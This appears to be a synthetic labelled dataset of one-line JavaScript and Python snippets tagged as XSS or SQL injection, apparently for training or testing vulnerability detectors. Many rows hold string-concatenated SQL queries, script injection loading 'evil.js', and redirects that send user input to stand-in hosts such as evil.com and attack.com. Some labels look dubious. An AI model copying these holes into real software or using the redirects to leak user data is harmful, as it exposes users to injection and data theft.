+ROW-501,XSS,javascript,line_12_501.js,snippet_501,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-502,XSS,javascript,line_10_502.js,snippet_502,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-503,SQLi,python,line_6_503.py,snippet_503,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-504,XSS,javascript,line_17_504.js,snippet_504,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-505,XSS,javascript,line_14_505.js,snippet_505,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-506,SQLi,javascript,line_4_506.js,snippet_506,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-507,XSS,javascript,line_1_507.js,snippet_507,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-508,SQLi,python,line_20_508.py,snippet_508,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-509,SQLi,python,line_5_509.py,snippet_509,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-510,SQLi,javascript,line_18_510.js,snippet_510,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-511,XSS,javascript,line_6_511.js,snippet_511,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-512,XSS,javascript,line_12_512.js,snippet_512,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-513,SQLi,python,line_17_513.py,snippet_513,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-514,SQLi,python,line_19_514.py,snippet_514,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-515,SQLi,python,line_1_515.py,snippet_515,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-516,XSS,javascript,line_20_516.js,snippet_516,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-517,XSS,javascript,line_17_517.js,snippet_517,alert('Hello ' + user_input);,,,,,statement
+ROW-518,XSS,javascript,line_14_518.js,snippet_518,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-519,XSS,javascript,line_6_519.js,snippet_519,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-520,XSS,javascript,line_7_520.js,snippet_520,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-521,XSS,javascript,line_10_521.js,snippet_521,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-522,SQLi,python,line_18_522.py,snippet_522,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-523,SQLi,python,line_1_523.py,snippet_523,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-524,XSS,javascript,line_19_524.js,snippet_524,alert('Hello ' + user_input);,,,,,statement
+ROW-525,XSS,javascript,line_4_525.js,snippet_525,alert('Hello ' + user_input);,,,,,statement
+ROW-526,XSS,javascript,line_1_526.js,snippet_526,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-527,XSS,javascript,line_3_527.js,snippet_527,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-528,SQLi,python,line_2_528.py,snippet_528,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-529,SQLi,python,line_10_529.py,snippet_529,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-530,SQLi,python,line_7_530.py,snippet_530,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-531,XSS,javascript,line_9_531.js,snippet_531,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-532,SQLi,python,line_13_532.py,snippet_532,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-533,SQLi,javascript,line_14_533.js,snippet_533,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-534,XSS,javascript,line_6_534.js,snippet_534,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-535,SQLi,python,line_9_535.py,snippet_535,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-536,XSS,javascript,line_9_536.js,snippet_536,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-537,SQLi,python,line_7_537.py,snippet_537,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-538,SQLi,python,line_14_538.py,snippet_538,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-539,SQLi,python,line_13_539.py,snippet_539,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-540,SQLi,python,line_8_540.py,snippet_540,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-541,XSS,javascript,line_19_541.js,snippet_541,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-542,SQLi,python,line_7_542.py,snippet_542,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-543,SQLi,python,line_17_543.py,snippet_543,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-544,XSS,javascript,line_4_544.js,snippet_544,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-545,SQLi,python,line_18_545.py,snippet_545,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-546,SQLi,python,line_3_546.py,snippet_546,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-547,SQLi,javascript,line_6_547.js,snippet_547,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-548,XSS,javascript,line_19_548.js,snippet_548,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-549,XSS,javascript,line_6_549.js,snippet_549,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-550,SQLi,python,line_6_550.py,snippet_550,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-551,XSS,javascript,line_10_551.js,snippet_551,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-552,XSS,javascript,line_10_552.js,snippet_552,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-553,XSS,javascript,line_9_553.js,snippet_553,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-554,XSS,javascript,line_2_554.js,snippet_554,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-555,XSS,javascript,line_10_555.js,snippet_555,alert('Hello ' + user_input);,,,,,statement
+ROW-556,SQLi,python,line_16_556.py,snippet_556,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-557,SQLi,javascript,line_20_557.js,snippet_557,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-558,SQLi,javascript,line_3_558.js,snippet_558,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-559,XSS,javascript,line_4_559.js,snippet_559,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-560,XSS,javascript,line_4_560.js,snippet_560,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-561,XSS,javascript,line_3_561.js,snippet_561,alert('Hello ' + user_input);,,,,,statement
+ROW-562,SQLi,javascript,line_17_562.js,snippet_562,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-563,XSS,javascript,line_1_563.js,snippet_563,alert('Hello ' + user_input);,,,,,statement
+ROW-564,SQLi,python,line_6_564.py,snippet_564,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-565,XSS,javascript,line_19_565.js,snippet_565,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-566,XSS,javascript,line_16_566.js,snippet_566,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-567,SQLi,javascript,line_7_567.js,snippet_567,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-568,SQLi,python,line_3_568.py,snippet_568,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-569,SQLi,python,line_9_569.py,snippet_569,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-570,SQLi,python,line_9_570.py,snippet_570,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-571,XSS,javascript,line_20_571.js,snippet_571,alert('Hello ' + user_input);,,,,,statement
+ROW-572,XSS,javascript,line_12_572.js,snippet_572,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-573,SQLi,javascript,line_7_573.js,snippet_573,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-574,XSS,javascript,line_7_574.js,snippet_574,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-575,XSS,javascript,line_2_575.js,snippet_575,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-576,SQLi,javascript,line_13_576.js,snippet_576,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-577,SQLi,python,line_9_577.py,snippet_577,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-578,XSS,javascript,line_4_578.js,snippet_578,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-579,SQLi,javascript,line_11_579.js,snippet_579,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-580,SQLi,javascript,line_5_580.js,snippet_580,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-581,SQLi,python,line_19_581.py,snippet_581,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-582,SQLi,javascript,line_1_582.js,snippet_582,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-583,SQLi,python,line_6_583.py,snippet_583,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-584,SQLi,python,line_14_584.py,snippet_584,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-585,SQLi,python,line_9_585.py,snippet_585,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-586,SQLi,python,line_12_586.py,snippet_586,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-587,SQLi,javascript,line_5_587.js,snippet_587,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-588,SQLi,python,line_8_588.py,snippet_588,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-589,SQLi,javascript,line_5_589.js,snippet_589,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-590,SQLi,python,line_10_590.py,snippet_590,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-591,XSS,javascript,line_12_591.js,snippet_591,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-592,SQLi,python,line_5_592.py,snippet_592,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-593,SQLi,javascript,line_19_593.js,snippet_593,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-594,SQLi,python,line_10_594.py,snippet_594,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-595,SQLi,javascript,line_16_595.js,snippet_595,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-596,XSS,javascript,line_4_596.js,snippet_596,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-597,XSS,javascript,line_20_597.js,snippet_597,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-598,SQLi,python,line_10_598.py,snippet_598,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-599,SQLi,python,line_6_599.py,snippet_599,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-600,XSS,javascript,line_11_600.js,snippet_600,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-601,XSS,javascript,line_18_601.js,snippet_601,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-602,SQLi,python,line_7_602.py,snippet_602,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-603,SQLi,python,line_19_603.py,snippet_603,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-604,SQLi,python,line_7_604.py,snippet_604,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-605,XSS,javascript,line_20_605.js,snippet_605,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-606,XSS,javascript,line_3_606.js,snippet_606,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-607,XSS,javascript,line_11_607.js,snippet_607,alert('Hello ' + user_input);,,,,,statement
+ROW-608,SQLi,python,line_4_608.py,snippet_608,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-609,XSS,javascript,line_7_609.js,snippet_609,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-610,SQLi,python,line_20_610.py,snippet_610,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-611,SQLi,javascript,line_6_611.js,snippet_611,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-612,SQLi,python,line_19_612.py,snippet_612,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-613,XSS,javascript,line_2_613.js,snippet_613,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-614,SQLi,python,line_19_614.py,snippet_614,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-615,XSS,javascript,line_16_615.js,snippet_615,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-616,XSS,javascript,line_6_616.js,snippet_616,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-617,SQLi,python,line_9_617.py,snippet_617,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-618,SQLi,python,line_17_618.py,snippet_618,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-619,XSS,javascript,line_6_619.js,snippet_619,alert('Hello ' + user_input);,,,,,statement
+ROW-620,XSS,javascript,line_6_620.js,snippet_620,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-621,SQLi,python,line_9_621.py,snippet_621,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-622,XSS,javascript,line_8_622.js,snippet_622,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-623,SQLi,python,line_5_623.py,snippet_623,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-624,SQLi,python,line_5_624.py,snippet_624,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-625,XSS,javascript,line_11_625.js,snippet_625,alert('Hello ' + user_input);,,,,,statement
+ROW-626,SQLi,python,line_5_626.py,snippet_626,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-627,XSS,javascript,line_5_627.js,snippet_627,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-628,SQLi,python,line_9_628.py,snippet_628,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-629,SQLi,python,line_15_629.py,snippet_629,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-630,XSS,javascript,line_1_630.js,snippet_630,alert('Hello ' + user_input);,,,,,statement
+ROW-631,SQLi,python,line_8_631.py,snippet_631,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-632,SQLi,javascript,line_11_632.js,snippet_632,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-633,XSS,javascript,line_7_633.js,snippet_633,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-634,XSS,javascript,line_12_634.js,snippet_634,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-635,XSS,javascript,line_10_635.js,snippet_635,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-636,XSS,javascript,line_13_636.js,snippet_636,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-637,SQLi,python,line_4_637.py,snippet_637,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-638,SQLi,python,line_3_638.py,snippet_638,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-639,XSS,javascript,line_1_639.js,snippet_639,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-640,SQLi,python,line_13_640.py,snippet_640,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-641,SQLi,python,line_11_641.py,snippet_641,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-642,XSS,javascript,line_13_642.js,snippet_642,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-643,XSS,javascript,line_13_643.js,snippet_643,alert('Hello ' + user_input);,,,,,statement
+ROW-644,SQLi,python,line_14_644.py,snippet_644,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-645,XSS,javascript,line_1_645.js,snippet_645,alert('Hello ' + user_input);,,,,,statement
+ROW-646,SQLi,python,line_16_646.py,snippet_646,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-647,SQLi,python,line_13_647.py,snippet_647,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-648,XSS,javascript,line_6_648.js,snippet_648,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-649,SQLi,python,line_7_649.py,snippet_649,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-650,SQLi,python,line_10_650.py,snippet_650,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-651,XSS,javascript,line_5_651.js,snippet_651,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-652,SQLi,python,line_5_652.py,snippet_652,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-653,SQLi,python,line_12_653.py,snippet_653,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-654,SQLi,python,line_6_654.py,snippet_654,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-655,SQLi,python,line_20_655.py,snippet_655,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-656,SQLi,python,line_9_656.py,snippet_656,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-657,SQLi,python,line_11_657.py,snippet_657,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-658,XSS,javascript,line_17_658.js,snippet_658,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-659,SQLi,python,line_9_659.py,snippet_659,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-660,SQLi,python,line_3_660.py,snippet_660,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-661,XSS,javascript,line_16_661.js,snippet_661,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-662,SQLi,python,line_11_662.py,snippet_662,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-663,XSS,javascript,line_14_663.js,snippet_663,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-664,XSS,javascript,line_13_664.js,snippet_664,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-665,SQLi,javascript,line_16_665.js,snippet_665,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-666,XSS,javascript,line_12_666.js,snippet_666,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-667,XSS,javascript,line_10_667.js,snippet_667,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-668,SQLi,python,line_2_668.py,snippet_668,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-669,SQLi,python,line_17_669.py,snippet_669,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-670,XSS,javascript,line_6_670.js,snippet_670,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-671,SQLi,python,line_8_671.py,snippet_671,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-672,XSS,javascript,line_3_672.js,snippet_672,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-673,XSS,javascript,line_14_673.js,snippet_673,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-674,XSS,javascript,line_19_674.js,snippet_674,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-675,XSS,javascript,line_4_675.js,snippet_675,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-676,SQLi,python,line_18_676.py,snippet_676,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-677,SQLi,python,line_13_677.py,snippet_677,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-678,XSS,javascript,line_17_678.js,snippet_678,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-679,XSS,javascript,line_11_679.js,snippet_679,alert('Hello ' + user_input);,,,,,statement
+ROW-680,SQLi,python,line_1_680.py,snippet_680,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-681,SQLi,python,line_12_681.py,snippet_681,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-682,SQLi,python,line_14_682.py,snippet_682,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-683,XSS,javascript,line_8_683.js,snippet_683,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-684,SQLi,python,line_19_684.py,snippet_684,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-685,SQLi,python,line_10_685.py,snippet_685,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-686,XSS,javascript,line_8_686.js,snippet_686,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-687,SQLi,python,line_11_687.py,snippet_687,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-688,XSS,javascript,line_12_688.js,snippet_688,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-689,XSS,javascript,line_15_689.js,snippet_689,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-690,SQLi,javascript,line_17_690.js,snippet_690,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-691,SQLi,javascript,line_7_691.js,snippet_691,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-692,XSS,javascript,line_11_692.js,snippet_692,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-693,XSS,javascript,line_2_693.js,snippet_693,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-694,SQLi,python,line_17_694.py,snippet_694,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-695,XSS,javascript,line_16_695.js,snippet_695,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-696,XSS,javascript,line_15_696.js,snippet_696,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-697,SQLi,python,line_3_697.py,snippet_697,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-698,XSS,javascript,line_10_698.js,snippet_698,alert('Hello ' + user_input);,,,,,statement
+ROW-699,SQLi,python,line_20_699.py,snippet_699,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-700,XSS,javascript,line_18_700.js,snippet_700,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-701,SQLi,python,line_19_701.py,snippet_701,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-702,SQLi,python,line_9_702.py,snippet_702,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-703,XSS,javascript,line_17_703.js,snippet_703,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-704,XSS,javascript,line_15_704.js,snippet_704,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-705,SQLi,javascript,line_2_705.js,snippet_705,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-706,SQLi,python,line_19_706.py,snippet_706,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-707,XSS,javascript,line_18_707.js,snippet_707,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-708,SQLi,python,line_4_708.py,snippet_708,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-709,SQLi,python,line_6_709.py,snippet_709,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-710,XSS,javascript,line_20_710.js,snippet_710,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-711,SQLi,python,line_12_711.py,snippet_711,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-712,SQLi,python,line_3_712.py,snippet_712,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-713,XSS,javascript,line_12_713.js,snippet_713,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-714,XSS,javascript,line_6_714.js,snippet_714,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-715,XSS,javascript,line_18_715.js,snippet_715,alert('Hello ' + user_input);,,,,,statement
+ROW-716,SQLi,python,line_13_716.py,snippet_716,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-717,XSS,javascript,line_8_717.js,snippet_717,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-718,XSS,javascript,line_20_718.js,snippet_718,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-719,SQLi,python,line_12_719.py,snippet_719,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-720,XSS,javascript,line_6_720.js,snippet_720,alert('Hello ' + user_input);,,,,,statement
+ROW-721,SQLi,python,line_11_721.py,snippet_721,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-722,SQLi,javascript,line_1_722.js,snippet_722,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-723,XSS,javascript,line_15_723.js,snippet_723,alert('Hello ' + user_input);,,,,,statement
+ROW-724,SQLi,python,line_1_724.py,snippet_724,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-725,XSS,javascript,line_19_725.js,snippet_725,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-726,SQLi,javascript,line_13_726.js,snippet_726,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-727,XSS,javascript,line_11_727.js,snippet_727,alert('Hello ' + user_input);,,,,,statement
+ROW-728,SQLi,python,line_6_728.py,snippet_728,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-729,XSS,javascript,line_20_729.js,snippet_729,alert('Hello ' + user_input);,,,,,statement
+ROW-730,SQLi,javascript,line_14_730.js,snippet_730,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-731,SQLi,python,line_9_731.py,snippet_731,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-732,SQLi,javascript,line_11_732.js,snippet_732,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-733,SQLi,python,line_19_733.py,snippet_733,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-734,XSS,javascript,line_3_734.js,snippet_734,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-735,XSS,javascript,line_16_735.js,snippet_735,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-736,SQLi,python,line_9_736.py,snippet_736,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-737,XSS,javascript,line_18_737.js,snippet_737,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-738,SQLi,javascript,line_5_738.js,snippet_738,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-739,XSS,javascript,line_2_739.js,snippet_739,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-740,XSS,javascript,line_14_740.js,snippet_740,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-741,XSS,javascript,line_9_741.js,snippet_741,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-742,SQLi,python,line_3_742.py,snippet_742,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-743,XSS,javascript,line_17_743.js,snippet_743,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-744,XSS,javascript,line_5_744.js,snippet_744,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-745,SQLi,javascript,line_2_745.js,snippet_745,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-746,SQLi,python,line_1_746.py,snippet_746,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-747,XSS,javascript,line_4_747.js,snippet_747,alert('Hello ' + user_input);,,,,,statement
+ROW-748,XSS,javascript,line_13_748.js,snippet_748,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-749,SQLi,python,line_6_749.py,snippet_749,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
